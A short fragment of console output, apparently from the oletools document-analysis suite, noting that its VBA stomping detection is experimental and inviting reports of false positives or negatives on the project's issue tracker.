+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

